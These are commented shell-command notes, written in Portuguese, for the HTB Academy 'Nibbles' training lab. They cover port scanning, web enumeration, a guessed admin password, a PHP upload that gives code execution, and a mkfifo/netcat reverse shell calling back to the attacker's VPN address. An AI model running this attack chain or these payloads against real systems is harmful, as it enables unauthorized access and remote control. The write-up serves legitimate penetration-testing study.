# ============================================================
# HTB Academy - Getting Started
# Máquina: Nibbles
# Seções: Enumeration, Web Footprinting e Initial Foothold
# Objetivo:
# 1. Enumerar portas e serviços
# 2. Identificar aplicação web
# 3. Encontrar diretórios e arquivos expostos
# 4. Descobrir usuário e senha
# 5. Explorar upload vulnerável
# 6. Obter RCE
# 7. Ganhar reverse shell
# 8. Ler user.txt
# ============================================================


# ============================================================
# 0. Definir IP do alvo
# Troque pelo IP atual da sua máquina no HTB
# ============================================================

export TARGET=10.129.200.170


# ============================================================
# 1. Scan inicial com Nmap
# -sV identifica versão dos serviços
# --open mostra apenas portas abertas
# -oA salva em três formatos: .nmap, .gnmap e .xml
# ============================================================

nmap -sV --open -oA nibbles_initial_scan $TARGET


# ============================================================
# 2. Ver quais portas o Nmap escaneia por padrão
# Esse comando falha porque não tem alvo, mas mostra a lista
# das 1000 portas TCP padrão
# ============================================================

nmap -v -oG -


# ============================================================
# 3. Ver arquivos gerados pelo scan inicial
# ============================================================

ls


# ============================================================
# 4. Scan completo de todas as portas TCP
# -p- verifica as portas de 1 até 65535
# Serve para descobrir serviços em portas não padrão
# ============================================================

nmap -p- --open -oA nibbles_full_tcp_scan $TARGET


# ============================================================
# 5. Banner grabbing na porta SSH
# Confirma manualmente a versão do SSH
# ============================================================

nc -nv $TARGET 22


# ============================================================
# 6. Banner grabbing na porta HTTP
# Testa conexão manual com o servidor web
# ============================================================

nc -nv $TARGET 80


# ============================================================
# 7. Scan com scripts padrão do Nmap
# -sC executa scripts NSE default
# -p 22,80 limita apenas às portas já conhecidas
# ============================================================

nmap -sC -p 22,80 -oA nibbles_script_scan $TARGET


# ============================================================
# 8. Enumeração HTTP com script http-enum
# Tenta encontrar diretórios comuns automaticamente
# ============================================================

nmap -sV --script=http-enum -oA nibbles_nmap_http_enum $TARGET


# ============================================================
# 9. Identificar tecnologias da página inicial
# whatweb mostra Apache, versão, headers e tecnologias web
# ============================================================

whatweb http://$TARGET


# ============================================================
# 10. Ver HTML da página inicial
# Aqui foi encontrado o comentário com /nibbleblog/
# ============================================================

curl http://$TARGET


# ============================================================
# 11. Acessar diretório descoberto no comentário HTML
# ============================================================

whatweb http://$TARGET/nibbleblog


# ============================================================
# 12. Enumerar diretórios dentro do Nibbleblog
# Gobuster procura arquivos e diretórios comuns
# ============================================================

gobuster dir -u http://$TARGET/nibbleblog/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt


# ============================================================
# 13. Ler README do Nibbleblog
# Aqui foi confirmada a versão v4.0.3
# ============================================================

curl http://$TARGET/nibbleblog/README


# ============================================================
# 14. Ler users.xml
# Esse arquivo confirmou o usuário admin
# xmllint formata o XML para leitura melhor
# ============================================================

curl -s http://$TARGET/nibbleblog/content/private/users.xml | xmllint --format -


# ============================================================
# 15. Enumerar diretórios da raiz do site
# Confirma que não há outros caminhos importantes fora do /nibbleblog/
# ============================================================

gobuster dir -u http://$TARGET/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt


# ============================================================
# 16. Ler config.xml
# Aqui aparecem pistas como Nibbles, nibbles.com e título do site
# Essas informações ajudaram a chutar a senha
# ============================================================

curl -s http://$TARGET/nibbleblog/content/private/config.xml | xmllint --format -


# ============================================================
# 17. Gerar wordlist com CeWL a partir do site
# Isso simula o processo citado na aula:
# gerar palavras com base no conteúdo do próprio alvo
# ============================================================

cewl http://$TARGET/nibbleblog/ -d 3 -w words.txt


# ============================================================
# 18. Visualizar wordlist gerada
# ============================================================

cat words.txt


# ============================================================
# 19. Remover duplicados e ordenar
# ============================================================

sort -u words.txt > clean.txt


# ============================================================
# 20. Procurar palavras interessantes na wordlist
# Exemplo: admin, nibble, yum, coffee
# ============================================================

grep -Ei "admin|nibble|yum|coffee" clean.txt


# ============================================================
# 21. Hipóteses criadas pela enumeração
# Usuário descoberto: admin
# Palavra recorrente: nibbles
# Credencial final usada no laboratório:
# admin:nibbles
# ============================================================


# ============================================================
# 22. Acessar login do Nibbleblog no navegador
# URL:
# http://10.129.200.170/nibbleblog/admin.php
#
# Usuário:
# admin
#
# Senha:
# nibbles
# ============================================================


# ============================================================
# 23. Criar arquivo PHP simples para testar RCE
# O comando id mostra qual usuário executa o código no servidor
# ============================================================

echo "<?php system('id'); ?>" > image.php


# ============================================================
# 24. Fazer upload manual pelo painel:
# Plugins
# My Image
# Configure
# Browse
# Selecionar image.php
# Save
#
# Mesmo que apareçam warnings de imagem, o upload pode funcionar.
# ============================================================


# ============================================================
# 25. Verificar diretório onde o plugin salva o arquivo
# O plugin salva como image.php dentro de my_image
# ============================================================

curl http://$TARGET/nibbleblog/content/private/plugins/my_image/


# ============================================================
# 26. Confirmar RCE acessando o arquivo enviado
# Resultado esperado:
# uid=1001(nibbler) gid=1001(nibbler)
# ============================================================

curl http://$TARGET/nibbleblog/content/private/plugins/my_image/image.php


# ============================================================
# 27. Descobrir seu IP da VPN HTB
# Use o IP da interface tun0 na reverse shell
# ============================================================

ip a | grep tun0 -A 3


# ============================================================
# 28. Criar payload PHP de reverse shell
# Troque SEU_IP_TUN0 pelo IP da sua VPN
# Exemplo: 10.10.14.2
# Porta usada: 9443
# ============================================================

echo '<?php system("rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc SEU_IP_TUN0 9443 > /tmp/f"); ?>' > image.php


# ============================================================
# 29. Fazer upload novamente pelo painel:
# Plugins
# My Image
# Configure
# Browse
# Selecionar o novo image.php
# Save
# ============================================================


# ============================================================
# 30. Abrir listener Netcat na sua máquina atacante
# Precisa ficar escutando antes de executar o payload
# ============================================================

nc -lvnp 9443


# ============================================================
# 31. Em outro terminal, executar o payload chamando o image.php
# Isso faz o alvo conectar de volta na sua máquina
# ============================================================

curl http://$TARGET/nibbleblog/content/private/plugins/my_image/image.php


# ============================================================
# 32. Confirmar usuário dentro da reverse shell
# ============================================================

id


# ============================================================
# 33. Melhorar shell com Python 2
# Pode falhar se python não existir
# ============================================================

python -c 'import pty; pty.spawn("/bin/bash")'


# ============================================================
# 34. Verificar se existe Python 3
# ============================================================

which python3


# ============================================================
# 35. Melhorar shell com Python 3
# Esse foi o método funcional na aula
# ============================================================

python3 -c 'import pty; pty.spawn("/bin/bash")'


# ============================================================
# 36. Ir para home do usuário nibbler
# ============================================================

cd /home/nibbler


# ============================================================
# 37. Listar arquivos encontrados
# Deve aparecer personal.zip e user.txt
# ============================================================

ls


# ============================================================
# 38. Ler flag de usuário
# Essa é a resposta da questão do HTB
# ============================================================

cat /home/nibbler/user.txt


# ============================================================
# FLUXO COMPLETO RESUMIDO
#
# IP do alvo
# ↓
# nmap -sV --open
# ↓
# portas 22 e 80 abertas
# ↓
# whatweb na porta 80
# ↓
# curl na página inicial
# ↓
# comentário HTML revela /nibbleblog/
# ↓
# whatweb em /nibbleblog/
# ↓
# aplicação identificada: Nibbleblog
# ↓
# gobuster encontra admin.php, README, content, plugins
# ↓
# README revela versão 4.0.3
# ↓
# users.xml revela usuário admin
# ↓
# config.xml revela pistas com Nibbles/nibbles
# ↓
# CeWL pode gerar wordlist baseada no site
# ↓
# hipótese de senha: nibbles
# ↓
# login admin:nibbles
# ↓
# plugin My Image permite upload
# ↓
# upload de PHP com system('id')
# ↓
# RCE confirmado como usuário nibbler
# ↓
# upload de PHP com reverse shell
# ↓
# nc recebe conexão
# ↓
# shell melhorada com python3 pty
# ↓
# cat /home/nibbler/user.txt
# ============================================================